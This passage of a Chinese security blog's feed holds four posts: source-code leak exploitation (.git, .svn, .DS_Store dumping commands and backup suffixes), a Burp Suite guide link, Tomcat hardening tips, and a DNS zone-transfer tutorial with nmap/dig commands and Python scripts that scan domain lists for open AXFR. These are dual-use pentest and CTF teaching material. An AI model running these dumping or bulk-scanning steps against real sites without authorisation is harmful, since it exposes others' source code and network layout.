  </entry>
  
  <entry>
    <title>Web源码泄露总结</title>
    <link href="http://sunu11.com/2017/04/28/11/"/>
    <id>http://sunu11.com/2017/04/28/11/</id>
    <published>2017-04-28T01:43:55.000Z</published>
    <updated>2017-04-28T07:56:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>在web渗透测试以及CTF中经常可以遇到源码泄露的问题，本文对常见的源码泄露进行了一个总结，有新的姿势持续<a id="more"></a>更新！</p><h2 id="0x00-Mercurial-hg源码泄露"><a href="#0x00-Mercurial-hg源码泄露" class="headerlink" title="0x00 Mercurial .hg源码泄露"></a>0x00 Mercurial .hg源码泄露</h2><p>hg在初始化代码库的时候，会在当前目录下面产生一个.hg的隐藏文件</p><p><code>e.g.http://www.example.com/.hg/</code></p><p><strong><em>利用：</em></strong><br>工具<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><blockquote><p>rip-hg.pl -v -u <a href="http://www.example.com/.hg" target="_blank" rel="external">http://www.example.com/.hg</a></p></blockquote><h2 id="0x01-git源码泄漏"><a href="#0x01-git源码泄漏" class="headerlink" title="0x01 .git源码泄漏"></a>0x01 .git源码泄漏</h2><p>在运行git init初始化的时候，在当前目录下产生一个隐藏的.git文件，这个目录是 Git 用来跟踪管理版本库的，里面存放了所提交的文档索引内容，Git 可以根据该文件夹内的内容对其所管理的文档进行内容跟踪，从而实现版本控制。如果使用者采用复制整个文件夹的方式将.git文件部署。或者其他的错误操作让.git文件暴露在外网环境中，攻击者就可以利用 .git 文件夹内的文件，还原重建工程源代码。</p><p><code>e.g.http://www.example.com/.git/</code></p><p><strong><em>利用：</em></strong><br>工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a> </p><blockquote><p>GitHack.py <a href="http://www.example.com/.git/" target="_blank" rel="external">http://www.example.com/.git/</a><br>该工具其他信息参考：<a href="http://www.freebuf.com/sectool/66096.html" target="_blank" rel="external">http://www.freebuf.com/sectool/66096.html</a></p></blockquote><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><blockquote><p>rip-git.pl -v -u <a href="http://www.example.com/.git/" target="_blank" rel="external">http://www.example.com/.git/</a></p></blockquote><h2 id="0x02-DS-Store文件泄漏"><a href="#0x02-DS-Store文件泄漏" class="headerlink" title="0x02 .DS_Store文件泄漏"></a>0x02 .DS_Store文件泄漏</h2><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p><code>e.g.http://www.example.com/.ds_store</code></p><p><strong><em>利用：</em></strong><br>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a></p><blockquote><p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store" target="_blank" rel="external">http://www.example.com/.DS_Store</a></p></blockquote><h2 id="0x03-svn文件泄漏"><a href="#0x03-svn文件泄漏" class="headerlink" title="0x03 .svn文件泄漏"></a>0x03 .svn文件泄漏</h2><p>使用svn版本控制系统时，由于错误操作将.svn文件暴露在外网环境中，即可利用该文件还原出服务器源码、SVN服务器账号密码等信息。</p><p><code>e.g.http://www.example.com/.svn/entries</code></p><p><strong><em>利用：</em></strong><br>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><blockquote><p>rip-git.pl -v -u <a href="http://www.example.com/.git/" target="_blank" rel="external">http://www.example.com/.git/</a></p></blockquote><p><a href="http://pan.baidu.com/s/1mrNpB" target="_blank" rel="external">Seay-Svn</a></p><blockquote><p>图形化工具，使用简单</p></blockquote><h2 id="0x04-CVS文件泄漏"><a href="#0x04-CVS文件泄漏" class="headerlink" title="0x04 .CVS文件泄漏"></a>0x04 .CVS文件泄漏</h2><p><strong><em>利用：</em></strong></p><blockquote><p><a href="http://www.example.com/CVS/Root" target="_blank" rel="external">http://www.example.com/CVS/Root</a> 返回根信息<br><a href="http://www.example.com/CVS/Entries" target="_blank" rel="external">http://www.example.com/CVS/Entries</a> 返回所有文件的结构<br>bk clone <a href="http://www.example.com/test" target="_blank" rel="external">http://www.example.com/test</a> dir 把远端一个名为test的repo clone到本地名为dir的目录下.<br>bk changes   查看所有的改变的命令，转到download的目录</p></blockquote><p>##0x05 Bazaar/bzr<br>Bazaar是一个版本控制系统，可帮助你随时追踪项目的历史，并与他人开展便利地合作。</p><p><strong><em>利用:</em></strong><br>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p><blockquote><p>rip-bzr.pl -v -u <a href="http://www.example.com/.bzr/" target="_blank" rel="external">http://www.example.com/.bzr/</a></p></blockquote><h2 id="0x06-备份文件合集："><a href="#0x06-备份文件合集：" class="headerlink" title="0x06 备份文件合集："></a>0x06 备份文件合集：</h2><p>在CTF中，备份文件这个考点经常出现，而在对网站进行修改或者升级过程中也会生成备份文件，如果这些文件未及时删除，而且文件又能被访问到时，就很有可能被恶意下载，利用。<br><strong>常见格式</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">.php~</div><div class="line">.un~</div><div class="line">.swp</div><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar</div><div class="line">.gz</div><div class="line">.tar.gz</div><div class="line">.~</div><div class="line">.bak</div><div class="line">.txt</div><div class="line">.html</div><div class="line">.vim</div><div class="line">.swn</div><div class="line">.swo</div><div class="line">.old</div></pre></td></tr></table></figure></p><h2 id="0x07-WEB-INF-web-xml泄露"><a href="#0x07-WEB-INF-web-xml泄露" class="headerlink" title="0x07 WEB-INF/web.xml泄露"></a>0x07 WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问<br>WEB-INF主要包含以下文件或目录：</p><blockquote><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class。<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件。</p></blockquote><p><strong><em>利用</em></strong>：<br>通过找到web.xml文件，推断class文件路径，最后下载class文件，通过反编译class文件，得到网站源码。</p><p><strong>防御</strong>：禁止访问WEB-INF目录：<code>location ~ ^/WEB-INF/* { deny all; }</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在web渗透测试以及CTF中经常可以遇到源码泄露的问题，本文对常见的源码泄露进行了一个总结，有新的姿势持续
    
    </summary>
    
      <category term="CTF" scheme="http://sunu11.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>burpsuite资源</title>
    <link href="http://sunu11.com/2017/03/27/10/"/>
    <id>http://sunu11.com/2017/03/27/10/</id>
    <published>2017-03-27T01:31:44.000Z</published>
    <updated>2017-04-26T13:46:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>近日发现一本老司机<strong>中文版</strong>的burpsuite开车指南，分想给大家，另外附上工具一份；<br>而且带有实例说明，适合学习。<a id="more"></a>感谢作者的贡献~~<br><img src="http://ofum8yjv2.bkt.clouddn.com/z14.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/z15.png" alt="icon"><br>分享链接<a href="http://pan.baidu.com/s/1c2qv5sO" target="_blank" rel="external">http://pan.baidu.com/s/1c2qv5sO</a> 密码：vwfs</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近日发现一本老司机&lt;strong&gt;中文版&lt;/strong&gt;的burpsuite开车指南，分想给大家，另外附上工具一份；&lt;br&gt;而且带有实例说明，适合学习。
    
    </summary>
    
      <category term="神器" scheme="http://sunu11.com/categories/%E7%A5%9E%E5%99%A8/"/>
    
    
      <category term="burpsuite" scheme="http://sunu11.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat安全加固</title>
    <link href="http://sunu11.com/2017/03/27/9/"/>
    <id>http://sunu11.com/2017/03/27/9/</id>
    <published>2017-03-27T01:00:19.000Z</published>
    <updated>2017-08-08T17:38:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结一些tomcat加固的要点</strong>：<br>1、删除$CATALINA_HOME/webapps下默认的所有目录文件。因为线上是不使用 Tomcat 默认提供的管理页面，另外删掉管理页面的两个配置文件<a id="more"></a><strong>host-manager.xml</strong>和<strong>manager.xml</strong>。位于<em>$CATALINA_HOME/conf/Catalina/localhost</em>。<br>2、为了tomcat版本信息泄露，隐藏或者伪装tomcat的版本信息。<br>默认Tomcat的版本信息如下:<br><img src="http://ofum8yjv2.bkt.clouddn.com/z1.png" alt="icon"><br>方法1、解压下图jar包，得到META-INF和org文件，修改<em>org/apache/catalina/util/ServerInfo.properties</em> 文件中的serverinfo字段实现更改tomcat的版本信息<br><img src="http://ofum8yjv2.bkt.clouddn.com/z2.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/z3.png" alt="icon"><br>修改完之后：<br><img src="http://ofum8yjv2.bkt.clouddn.com/z4.png" alt="icon"><br>方法2、修改<em>$CATALINA_HOME/conf/server.xml</em>，在Connector节点添加server字段。<br><img src="http://ofum8yjv2.bkt.clouddn.com/z5.png" alt="icon"><br>3、用户管理:<br>如果不需要web部署应用，可以注释或者删除<em>tomcat-users.xml</em>下用户权限相关配置<br><img src="http://ofum8yjv2.bkt.clouddn.com/z6.png" alt="icon"><br> 4、如不需要自动部署，关闭自动部$CATALINA_HOME/署功能<br>修改conf/server.xml中的host字段，将下图处修改为：<em>unpackWARs=”false” autoDeploy=”false”</em>。<br><img src="http://ofum8yjv2.bkt.clouddn.com/z7.png" alt="icon"><br>5、启动cookie的httpOnly属性；<br>修改 <em>$CATALINA_HOME/conf/context.xml</em>中添加如下图所示配置：<br><img src="http://ofum8yjv2.bkt.clouddn.com/z8.png" alt="icon"><br>启动cookie的secure属性，只允许cookie在加密方式下传输；<br>在web.xml中sesion-config节点配置cooker-config。<br><img src="http://ofum8yjv2.bkt.clouddn.com/z9.png" alt="icon"><br>6、服务权限控制：<br>tomcat以非root权限启动，应用部署目录权限和tomcat服务启动用户分离，如tomcat以tomcat用户启动，而部署应用的目录设置为nobody用户750.<br>7、AJP端口管理<br>AJP是为 Tomcat 与 HTTP 服务器之间通信而定制的协议，能提供较高的通信速度和效率。如果tomcat前端放的是apache的时候，会使用到AJP这个连接器。前端如果是由nginx做的反向代理的话可以不使用此连接器，因此需要注销掉该连接器。<br>修改如下图所示：<br><img src="http://ofum8yjv2.bkt.clouddn.com/z10.png" alt="icon"><br> 8、禁止列目录：<br>修改web.xml如下图所示<br><img src="http://ofum8yjv2.bkt.clouddn.com/z11.png" alt="icon"><br> 9、自定义错误页面（40X、50X），防止信息泄露：<br><img src="http://ofum8yjv2.bkt.clouddn.com/z12.png" alt="icon"><br> 10、依据实际情况，定义会话超时时间：<br><img src="http://ofum8yjv2.bkt.clouddn.com/z13.png" alt="icon"><br>11、合理设置maxThreads，一般设置为8000以下，如果网址访问量非常大，建议运行多个tomcat做负载均衡处理且需注意jvm的参数配置。当心由于jvm参数过小而崩溃。配置命令在<em>$CATALINA_HOME/conf/server.xml</em>中。<br>12、强烈建议不要使用 Tomcat 的虚拟主机，推荐每个站点使用一个实例。即可以启动多个 Tomcat。<br>里面包含多个虚拟主机。因为tomcat是多线程，共享内存，任何一个虚拟主机中的应用崩溃，都会影响到所有应用程序。虽然采用多实例的方式会产生过多的开销，但至少保障了应用程序的隔离和安全。<br><strong>注意升级过程中</strong>：<br>1、避免跨大版本的升级<br>2、将当前老版本tomcat的server.xml(<em>Tomcat主配置文件Server、Service、Engine、Host、Context、Connector</em>)、catalina.sh(<em>配置环境context .xml:指定tomcat和应用的启动路径、java运行时路径、java运行时参数、远程调试参数</em>)web.xml(<em>配置整个tomcat的jsp和servlet工作中的一些情况:servlet、servlet-mapping、session-config、mime-mapping、welcom-file-list、监听器、过滤器、error-page</em>)、tomcat-users.xml(<em>配置用户</em>)文件进行备份，然后部署完新版本的tomcat之后，将这些配置文件覆盖过去即可，再停掉旧版本，启动新版本即可。</p><p>～～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;总结一些tomcat加固的要点&lt;/strong&gt;：&lt;br&gt;1、删除$CATALINA_HOME/webapps下默认的所有目录文件。因为线上是不使用 Tomcat 默认提供的管理页面，另外删掉管理页面的两个配置文件
    
    </summary>
    
      <category term="安全服务" scheme="http://sunu11.com/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"/>
    
    
      <category term="Tomcat" scheme="http://sunu11.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>DNS域传送漏洞</title>
    <link href="http://sunu11.com/2017/03/16/8/"/>
    <id>http://sunu11.com/2017/03/16/8/</id>
    <published>2017-03-15T16:28:06.000Z</published>
    <updated>2017-08-08T17:38:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文将对dns域传送漏洞进行分析与总结，如有错误，欢迎指出。谢谢!</p><h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p><strong>DNS:</strong> 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访<a id="more"></a>问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">常用DNS记录：</div><div class="line">主机记录(A记录):          A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</div><div class="line">IPv6主机记录(AAAA记录):  与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 </div><div class="line">别名(CNAME记录):       CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。</div><div class="line">电子邮件交换记录（MX记录):  记录一个邮件域名对应的IP地址</div><div class="line">域名服务器记录 (NS记录):  记录该域名由哪台域名服务器解析</div><div class="line">反向记录(PTR记录):    也即从IP地址到域名的一条记录</div><div class="line">TXT记录：     记录域名的相关文本信息</div></pre></td></tr></table></figure></p><p><strong>DNS区域传送:</strong> DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。<br><strong>DNS域传送漏洞:</strong> 一般DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，即允许不受信任的因特网用户执行DNS区域传送操作。<br><strong>危害:</strong> 便于快速判断出某个特定区域的所有主机，获取域信息，如网络拓扑结构、服务器ip地址，为攻击者的入侵提供大量敏感信息。<br><strong>nslookup</strong><br>nslookup是一个网络管理命令行工具，可用于许多计算机操作系统查询域名系统（DNS）以获取域名或IP地址映射或任何其他特定的DNS记录。<br>使用方式<br>非交互式：<br><img src="http://ofum8yjv2.bkt.clouddn.com/dns1.png" alt="icon"><br>交互式：<br><img src="http://ofum8yjv2.bkt.clouddn.com/dns2.png" alt="icon"><br><strong>dig</strong><br>dig是Linux默认自带的DNS拨测工具<a href="http://www.codeweblog.com/host-nslookup-dig%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">传送门</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">root@sunu11：~# dig -h</div><div class="line">  Usage:  dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125;</div><div class="line">          &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125;</div><div class="line">          [ host [@local-server] &#123;local-d-opt&#125; [...]]</div><div class="line">  Where:  domain    is in the Domain Name System</div><div class="line">      q-class  is one of (in,hs,ch,...) [default: in]</div><div class="line">      q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a]</div><div class="line">               (Use ixfr=version for type ixfr)</div><div class="line">      q-opt    is one of:</div><div class="line">               -x dot-notation     (shortcut for reverse lookups)</div><div class="line">               -t type             (specify query type)</div><div class="line">      d-opt    is of the form +keyword[=value], where keyword is:</div><div class="line">               +[no]cmd            (Control display of command line)</div><div class="line">               +[no]comments       (Control display of comment lines)</div><div class="line">               +[no]question       (Control display of question)</div><div class="line">               +[no]answer         (Control display of answer)</div><div class="line">               +[no]authority      (Control display of authority)</div><div class="line">               +[no]additional     (Control display of additional)</div><div class="line">               +[no]stats          (Control display of statistics)</div><div class="line">               +[no]short          (Disable everything except short</div><div class="line">                                    form of answer)</div><div class="line">               +[no]all            (Set or clear all display flags)</div><div class="line">      global d-opts and servers (before host name) affect all queries.</div><div class="line">      local d-opts and servers (after host name) affect only that lookup.</div><div class="line">      -h                           (print help and exit)</div><div class="line">      -v                           (print version and exit)</div></pre></td></tr></table></figure></p><h2 id="0x01-实施"><a href="#0x01-实施" class="headerlink" title="0x01 实施"></a>0x01 实施</h2><h3 id="一、收集dns服务器信息"><a href="#一、收集dns服务器信息" class="headerlink" title="一、收集dns服务器信息"></a>一、收集dns服务器信息</h3><p>1、手工使用nslookup命令、whois查询等手段进行对某个域名的dns服务器信息的收集<br><img src="http://ofum8yjv2.bkt.clouddn.com/dns3.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/dns4.png" alt="icon"><br>2、利用网络空间搜索引擎收集域名服务器信息。如（shadon、zoomeye、fofa等）<br><img src="http://ofum8yjv2.bkt.clouddn.com/dns5.png" alt="icon"><br>3、使用<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">MASSCAN</a> 进行端口扫描后，获取开放53号端口的dns服务器地址；请参考<a href="http://www.freebuf.com/sectool/112583.html" target="_blank" rel="external">使用指南</a>。<br>4、网上存在一些dns社工裤，也可以从中获取所需要的dns服务器信息。</p><h3 id="二、检测DNS域传送漏洞"><a href="#二、检测DNS域传送漏洞" class="headerlink" title="二、检测DNS域传送漏洞"></a>二、检测DNS域传送漏洞</h3><h5 id="1、使用nmap扫描"><a href="#1、使用nmap扫描" class="headerlink" title="1、使用nmap扫描"></a>1、使用nmap扫描</h5><p>使用如下命令：</p><blockquote><p>nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=xxx -p 53 -Pn dns.xxx</p></blockquote><p><img src="http://ofum8yjv2.bkt.clouddn.com/dns6.png" alt="icon"><br><em>其中dns-zone-transfer.domain参数为指定要查询的域；dns.xxx 为指定的查询域名服务器</em></p><h5 id="2、使用dig命令"><a href="#2、使用dig命令" class="headerlink" title="2、使用dig命令"></a>2、使用dig命令</h5><p><img src="http://ofum8yjv2.bkt.clouddn.com/dns7.1.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/dns7.2.png" alt="icon"><br><em>其中@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名</em></p><h5 id="3、nslookup命令"><a href="#3、nslookup命令" class="headerlink" title="3、nslookup命令"></a>3、nslookup命令</h5><h6 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1) 输入nslookup命令进入交互式shell界面;</div><div class="line">2) server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。</div><div class="line">3) ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。</div><div class="line">4) exit命令退出</div></pre></td></tr></table></figure><p><img src="http://ofum8yjv2.bkt.clouddn.com/dns8.png" alt="icon"></p><h6 id="非交互式方法"><a href="#非交互式方法" class="headerlink" title="非交互式方法"></a>非交互式方法</h6><p>为了避免和nslookup交换，可以编写一个ls.bat。<code>echo ls %1 | nslookup – %2</code>通过执行<code>ls.bat xxx.edu.cn dns.xxx.edu.cn</code>进行测试。</p><h2 id="0x02-拓展"><a href="#0x02-拓展" class="headerlink" title="0x02 拓展"></a>0x02 拓展</h2><h3 id="单个查询："><a href="#单个查询：" class="headerlink" title="单个查询："></a>单个查询：</h3><p>【使用<code>dztester.py [domain]</code>即可】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding:utf-8</div><div class="line"># Build by LandGrey 2016-12-03</div><div class="line">  import re</div><div class="line">  import os</div><div class="line">  import sys</div><div class="line">  </div><div class="line">  def dns_zone_tranfer_finder(domain):</div><div class="line">    print &apos;[+] Nslookup %s&apos; % domain</div><div class="line">    cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read()  # fetch DNS Server List</div><div class="line">    dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res)</div><div class="line">    if len(dns_servers) == 0:</div><div class="line">      print &apos;[+] No DNS Server Found!\n&apos;</div><div class="line">       exit(0)</div><div class="line">    for singledns in dns_servers:</div><div class="line">       print &apos;[+] Using @%s&apos; % singledns</div><div class="line">        cmd_res = os.popen(&apos;dig @%s axfr %s&apos; % (singledns, domain)).read()</div><div class="line">      # print cmd_res</div><div class="line">      if cmd_res.find(&apos;XFR size&apos;) &gt; 0:</div><div class="line">          print &apos;[+] Vulnerable dns server found:&apos;, singledns</div><div class="line">          print cmd_res</div><div class="line">      else:</div><div class="line">          print &apos;[+] No Vulnerable found&apos;</div><div class="line">def usage():</div><div class="line">  print &apos;[+] Usage: python DZT-tester.py [domain]\n&apos;</div><div class="line">  </div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">  if len(sys.argv) != 2:</div><div class="line">      usage()</div><div class="line">  elif &apos;-h&apos; in sys.argv[1]:</div><div class="line">      usage()</div><div class="line">  else:</div><div class="line">      domain = sys.argv[1]</div><div class="line">      print &apos;[+] Test %s&apos; % domain</div><div class="line">      dns_zone_tranfer_finder(domain)</div><div class="line">      print &apos;[+] Finished!&apos;</div></pre></td></tr></table></figure></p><h3 id="批量查询脚本："><a href="#批量查询脚本：" class="headerlink" title="批量查询脚本："></a>批量查询脚本：</h3><p><strong>脚本同一目录下应有<code>dns-zone-transfer</code>目录；<code>dns-zone-transfer</code>目录下有‘dns’子目录；要检测的域名列表存放在<code>dns-zone-transfer\domain.txt</code>中，一行一个。结果存储在<code>dns-zone-transfer\dns</code>目录和<code>dns-zone-transfer\vulnerable_hosts.txt</code>文件中。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"># coding:utf-8</div><div class="line"></div><div class="line">import re</div><div class="line">import os</div><div class="line">import sys</div><div class="line">import threading</div><div class="line"></div><div class="line"></div><div class="line">def dns_zone_tranfer_finder():</div><div class="line">  global c_index</div><div class="line">  while True:</div><div class="line">      lock.acquire()</div><div class="line">      if c_index &gt;= len(DomainLists):</div><div class="line">          lock.release()</div><div class="line">          break</div><div class="line">      domain = DomainLists[c_index].lstrip(&apos;www.&apos;)</div><div class="line">      c_index += 1</div><div class="line">      lock.release()</div><div class="line">      cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read()    # fetch DNS Server List</div><div class="line">      dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res)</div><div class="line">      for server in dns_servers:</div><div class="line">          if len(server) &lt; 5:</div><div class="line">              server += domain</div><div class="line">          cmd_res = os.popen(&apos;dig @%s axfr %s +short&apos; % (server, domain)).read()</div><div class="line">          if cmd_res.find(&apos;XFR size&apos;) &gt; 0 \</div><div class="line">                  and cmd_res.find(&apos;Transfer failed.&apos;) &lt; 0 \</div><div class="line">                  and cmd_res.find(&apos;connection timed out&apos;) &lt; 0:</div><div class="line">              lock.acquire()</div><div class="line">              print &apos;*&apos; * 10 + &apos; Vulnerable dns server found:&apos;, server, &apos;*&apos; * 10</div><div class="line">              lock.release()</div><div class="line">              with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;vulnerable_hosts.txt&apos;), &apos;a&apos;) as f:</div><div class="line">                  f.write(&apos;%s    %s\n&apos; % (server.ljust(30), domain))</div><div class="line">              with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;dns&apos;, server + &apos;.txt&apos;), &apos;w&apos;) as f:</div><div class="line">                  f.write(cmd_res)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">  currentdir = os.path.dirname(sys.argv[0])</div><div class="line">  target = open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;domain.txt&apos;))</div><div class="line">  DomainLists = []</div><div class="line">  for host in target.readlines():</div><div class="line">      DomainLists.append(host)</div><div class="line">  print u&apos;采集 %d 个...&apos; % len(DomainLists)</div><div class="line">  threads = []</div><div class="line">  c_index = 0</div><div class="line">  lock = threading.Lock()</div><div class="line">  for i in range(10):</div><div class="line">      t = threading.Thread(target=dns_zone_tranfer_finder)</div><div class="line">      t.start()</div><div class="line">      threads.append(t)</div><div class="line">  for t in threads:</div><div class="line">      t.join()</div><div class="line">  print &apos;All Done!&apos;</div></pre></td></tr></table></figure></p><p><em>漏洞存在标识主要是dig命令结果中出现特征字符串<code>“XFR size”</code></em></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>linux系统和windows系统都可以检测出使用的DNS是否存在域传送漏洞，如果存在该漏洞，通过执行命令我们可以清楚的看到整个域下的域名解析信息。<br>解决方案：区域传送是DNS常用的功能，严格限制允许区域传送的主机是解决dns域传送漏洞的有效手段。<strong>最后感谢前辈们的文章与辛勤奉献！ 本文作技术研究使用，切勿用本文中的方法违法犯罪！</strong><br><strong>参考链接:</strong><br>李劼杰DNS域传送漏洞系列博客  <a href="http://www.lijiejie.com/?s=DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E&amp;submit=Search" target="_blank" rel="external">http://www.lijiejie.com/?s=DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E&amp;submit=Search</a><br>DNS域传送漏洞的收集、检测与利用  <a href="http://blog.csdn.net/c465869935/article/details/53444117" target="_blank" rel="external">http://blog.csdn.net/c465869935/article/details/53444117</a><br>DNS域传送漏洞利用  <a href="https://www.waitalone.cn/dns-domain-transfer-exploits.html" target="_blank" rel="external">https://www.waitalone.cn/dns-domain-transfer-exploits.html</a><br>lijiejie/edu-dns-zone-transfer <a href="https://github.com/lijiejie/edu-dns-zone-transfer/blob/master/vulnerable_hosts.txt" target="_blank" rel="external">https://github.com/lijiejie/edu-dns-zone-transfer/blob/master/vulnerable_hosts.txt</a></p><p>～～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将对dns域传送漏洞进行分析与总结，如有错误，欢迎指出。谢谢!&lt;/p&gt;
